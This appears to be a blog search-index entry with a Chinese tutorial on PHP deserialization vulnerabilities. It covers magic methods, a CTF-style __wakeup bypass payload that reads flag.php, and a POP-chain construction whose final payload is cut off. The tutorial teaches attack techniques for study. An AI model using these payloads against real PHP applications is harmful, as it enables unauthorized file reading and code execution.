<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>php反序列化漏洞入门到放弃</title>
      <link href="/2019/01/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83/"/>
      <url>/2019/01/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>序列化就是:<br>将php变量比如php数组或者对象转换为字节流,字节流可以储存在数据库里面</p><p>相关函数:</p><pre><code>serialize()              //将对象转换为字符串unserialize()           // 将字符串还原为一个对象addslashes()                // 对写入数据库的数据进行处理,stripslashes()                //对数据进行处理</code></pre><p>   相关方法:</p><pre><code>__wakeup() //使用unserialize时触发__sleep() //使用serialize时触发__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发,调用不到方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问的属性读取数据__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__toString() //把类当作字符串使用时触发__invoke() //当脚本尝试将对象调用为函数时触发</code></pre><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><p><strong>例子</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">private</span> $flag = <span class="string">"123"</span>;   <span class="comment">//序列化后为 &lt;0x00&gt;test&lt;0x00&gt;flag</span></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $flag1 = <span class="string">"123"</span>;   <span class="comment">//序列化后为flag</span></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $a =<span class="string">"aaa"</span>;        <span class="comment">// 序列化后为a</span></span></span><br><span class="line"><span class="php">    <span class="keyword">static</span> $b =<span class="string">"bbb"</span>;        <span class="comment">// 序列化后不存在与序列化后的字符串内   </span></span></span><br><span class="line"><span class="php">    <span class="keyword">protected</span> $c= <span class="string">"ccc"</span>;     <span class="comment">//序列化后  &lt;0x00&gt;*&lt;0x00&gt;c</span></span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$test1  = <span class="keyword">new</span> test;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$data = serialize($test1); <span class="comment">//将对象进行序列化为字符串</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $data.<span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输出</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:4</span><span class="selector-pseudo">:"test"</span><span class="selector-pseudo">:4</span>:&#123;<span class="attribute">s</span>:<span class="number">10</span>:<span class="string">"&lt;0x00&gt;&lt;test&gt;&lt;0x00&gt;flag"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"123"</span>;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"flag1"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"123"</span>;<span class="attribute">s</span>:<span class="number">1</span>:<span class="string">"a"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"aaa"</span>;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"&lt;0x00&gt;*&lt;0x00&gt;c"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"ccc"</span>;&#125;</span><br></pre></td></tr></table></figure><p>0:4:”test”:4<br>代表 O为对象 站四个字符为test 有4个属性<br>{} 里面的为 属性昵称 和 属性值<br>格式:{类型:变量长度:”变量名”；类型:变量值长度:”变量值”}  //六个 : 为一组 前三个代表属性名 后三个代表属性值</p><p>注:<br>私有属性会在 text两边加上空子节 所以长度为10<br>保护属性同样也会在*两边加空字节<0x00><0x00></0x00></0x00></p><p><strong>进行反序列化</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data1</span> = unserialize(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line">//<span class="built_in">echo</span> <span class="variable">$data1</span>.<span class="string">"\n"</span>;  <span class="built_in">echo</span> 只能输出字符串且不换行  所以输出对象时会报错</span><br><span class="line"></span><br><span class="line">var_dump(<span class="variable">$data1</span>);</span><br></pre></td></tr></table></figure><pre><code>object(test)#2 (4) {  [&quot;flag&quot;:&quot;test&quot;:private]=&gt;  string(3) &quot;123&quot;  [&quot;flag1&quot;]=&gt;  string(3) &quot;123&quot;  [&quot;a&quot;]=&gt;  string(3) &quot;aaa&quot;  [&quot;c&quot;:protected]=&gt;  string(3) &quot;ccc&quot;}</code></pre><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p><strong>__sleep()</strong><br>在进行序列化的时候<br>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误</p><p>通俗的讲就是 对象的哪些属性应该被序列化<br><strong>sleep方法<strong>必须返回一个数组</strong>,包含需要串行化的属性. PHP会抛弃其它属性的值. 如果没有</strong>sleep方法,PHP将保存所有属性.</p><p><strong>__wakeup()</strong><br>unserialize() 会检查是否存在一个 <strong>wakeup() 方法。如果存在，则会先调用 </strong>wakeup 方法，预先准备对象需要的资源。<br><strong>wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。<br>通俗讲就是还会对</strong>wakeup里面的属性进行反序列化</p><p>这两个方法都不接受参数,</p><p><strong>实例</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Caiji</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($ID, $sex, $age)</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;ID = $ID;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;sex = $sex;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;age = $age;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">"ID: %s, age: %d, sex: %s"</span>, <span class="keyword">$this</span>-&gt;ID, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;a = <span class="string">"aaa"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;b = <span class="string">"bbb"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;info . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> [<span class="string">'ID'</span>, <span class="string">'sex'</span>, <span class="string">'age'</span>];  <span class="comment">// info 属性不会被序列化</span></span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span> . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;info = sprintf(<span class="string">"ID: %s, age: %d, sex: %s"</span>, <span class="keyword">$this</span>-&gt;ID, <span class="keyword">$this</span>-&gt;sex, <span class="keyword">$this</span>-&gt;age);</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;c = <span class="string">"ccc"</span>;  <span class="comment">// 属性c会被序列化 属性a不会</span></span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$me = <span class="keyword">new</span> Caiji(<span class="string">'twosmi1e'</span>, <span class="number">20</span>, <span class="string">'male'</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$me-&gt;getInfo();</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"><span class="comment">//存在__sleep()函数，$info属性不会被存储</span></span></span><br><span class="line"><span class="php">$temp = serialize($me);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $temp . <span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$me = unserialize($temp);  <span class="comment">// info属性也会被反序列化</span></span></span><br><span class="line"><span class="php"><span class="comment">//__wakeup()组装的$info</span></span></span><br><span class="line"><span class="php">var_dump($me);</span></span><br><span class="line"><span class="php"><span class="comment">//$me-&gt;getInfo();</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>__toString()</strong></p><p>__toString() 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</p><p>就是当使用  echo 对象名    因为echo只能用来输出字符串 当用在输出对象时,就会在类里面寻找__toString()  输出这个方法的返回值<br><strong>实例</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">xiaoyang</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $xiaoyang;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($xiaoyang)</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">$this</span>-&gt;xiaoyang = $xiaoyang;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"-----------------"</span>.<span class="string">"\n"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;xiaoyang;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$class = <span class="keyword">new</span> xiaoyang(<span class="string">'hello xiaoyang'</span>);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $class;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="输出"><a href="#输出" class="headerlink" title="   输出:"></a>   输出:</h2><pre><code>hello xiaoyang[Finished in 0.1s]</code></pre><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h3 id="绕过-wakeup"><a href="#绕过-wakeup" class="headerlink" title="绕过__wakeup()"></a>绕过__wakeup()</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> </span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123; </span></span><br><span class="line"><span class="php">  <span class="keyword">protected</span> $file=<span class="string">'index.php'</span>;</span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123; </span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span></span><br><span class="line"><span class="php">      <span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt; file,<span class="string">"\\"</span>)===<span class="keyword">false</span> &amp;&amp;  strchr(<span class="keyword">$this</span>-&gt;file, <span class="string">'/'</span>)===<span class="keyword">false</span>)  </span></span><br><span class="line"><span class="php">      <span class="comment">//strchr()返回/及其剩余的部分  strstr()的别名</span></span></span><br><span class="line"><span class="php">        show_source(dirname (<span class="keyword">__FILE__</span>).<span class="string">'/'</span>.<span class="keyword">$this</span> -&gt;file);</span></span><br><span class="line"><span class="php">      <span class="comment">// show_source()   别名 highlight_file()   测试文件 进行 PHP 语法高亮显示：</span></span></span><br><span class="line"><span class="php">      <span class="keyword">else</span></span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'Wrong filename.'</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">  &#125;  </span></span><br><span class="line"><span class="php">  <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">   <span class="keyword">$this</span>-&gt; file=<span class="string">'index.php'</span>;</span></span><br><span class="line"><span class="php">  &#125; </span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> <span class="string">''</span> ;</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;     </span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123; </span></span><br><span class="line"><span class="php">  show_source(<span class="string">'index.php'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123; </span></span><br><span class="line"><span class="php">  $file=base64_decode($_GET[<span class="string">'file'</span>]); </span></span><br><span class="line"><span class="php">  <span class="keyword">echo</span> unserialize($file); </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"> <span class="meta">?&gt;</span></span> #<span class="comment">&lt;!--key in flag.php--&gt;</span></span><br></pre></td></tr></table></figure><p><strong>destruct()方法会读取文件<br>思路大概就是构造序列化对象然后base64编码传入，经过unserialize将file设为flag.php，但是</strong>wakeup会在unserialize之前执行，所以要绕过这一点。</p><p>当序列化属性要大于真实属性的个数时, 会跳过__wakeup()</p><p>先构造序列化<br>构造序列化对象：O:5:”SoFun”:1:{S:7:”\00*\00file”;s:8:”flag.php”;}</p><p>再修改属性值<br>构造序列化对象：O:5:”SoFun”:2:{S:7:”\00*\00file”;s:8:”flag.php”;}</p><p><strong>注:</strong><br>因为file是protect属性，所以需要加上\00*\00。再base64编码。</p><h3 id="session反序列化漏洞"><a href="#session反序列化漏洞" class="headerlink" title="session反序列化漏洞"></a>session反序列化漏洞</h3><h2 id="POP链构造"><a href="#POP链构造" class="headerlink" title="POP链构造"></a>POP链构造</h2><p><strong>类的构成</strong><br>类成员包括由属性和方法构成，类属性存在于数据段，类方法存在于代码段，对于一个类来说，类的方法不占用类的空间，占空间的只有类的属性</p><p><strong>概念</strong><br>在二进制利用时，ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集，而 POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。<br>二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，前提：进行反序列化的数据能够被用户输入所控制。</p><p><strong>POP链利用</strong><br>一般的序列化攻击都在PHP魔术方法中出现可利用的漏洞，因为自动调用触发漏洞，但如果关键代码没在魔术方法中，而是在一个类的普通方法中。这时候就可以通过构造POP链寻找相同的函数名将类的属性和敏感函数的属性联系起来<br><strong>挖掘思路</strong><br>能控制反序列化的点<br>反序列化类有魔术方法<br>魔术方法里有敏感操作（常规思路）<br>魔术方法里无敏感操作，但是通过属性（对象）调用了一些函数，恰巧在其他的类中有同名的函数（pop链）</p><p><strong>例子</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod2;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;mod1-&gt;test1();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Call</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod2;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">funct</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod2;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($test2,$arr)</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                $s1 = <span class="keyword">$this</span>-&gt;mod1;</span></span><br><span class="line"><span class="php">                $s1();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">func</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod2;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;mod2 = <span class="string">"字符串拼接"</span>.<span class="keyword">$this</span>-&gt;mod1;</span></span><br><span class="line"><span class="php">        &#125; </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">string1</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $str1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $str2;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">$this</span>-&gt;str1-&gt;get_flag();</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="string">"1"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">echo</span> <span class="string">"flag:"</span>.<span class="string">"xxxxxxxxxxxx"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$a = $_GET[<span class="string">'string'</span>];</span></span><br><span class="line"><span class="php">unserialize($a);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>首先看到 flag的输出在 GetFlag 类的普通方法get_flag里面<br>要想让这个方法执行 就要构造POP链</p><p>步骤:</p><ol><li><p>在 string1类 中发现同名方法 get_flag() 在string类的<strong>tostring中 要想让</strong>tostring执行就想要把类string 当做字符串 因为调用的是参数str1 的方法 所以要将str1 赋值为 类getFlag 的对象<br>public function __construct(){</p><pre><code>  $this-&gt;str1 = new GetFlag();    //将$str1赋值为  类Getflag 的对象}</code></pre></li><li><p>在 fnc类 发现<strong>invoke方法 当把对象当做函数时会调用此方法 $this-&gt;mod2 = “字符串拼接”.$this-&gt;mod1;<br>将$mod1赋值为 string1类 的对象<br>public function </strong>construct(){</p><pre><code>  $this-&gt;mod1 = new string1();}</code></pre></li><li><p>funct类 中的<strong>call 方法 中 调用类mod1方法 且参数为$test2,即无法调用test2方法时自动调用 </strong>call方法<br>需要将mod1 赋值为 func类 的对象<br>public function __construct(){</p><pre><code>  $this-&gt;mod1 = new func();}</code></pre></li><li><p>在Call中的test1方法中存在$this-&gt;mod1-&gt;test2();，需要把$mod1赋值为funct的对象，让<strong>call自动调用。<br>public function </strong>construct(){</p><pre><code>  $this-&gt;mod1 = new funct();}</code></pre></li></ol><p>5.查找test1方法的调用点，在start_gg中发现$this-&gt;mod1-&gt;test1();，把$mod1赋值为start_gg类的对象，等待<strong>destruct()自动调用。<br>public function </strong>construct(){<br>          $this-&gt;mod1 = new Call();<br>        }</p><p>最终payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">start_gg</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod1;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $mod2;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">          <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> Call();</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span></span><br><span class="line"><span class="php">        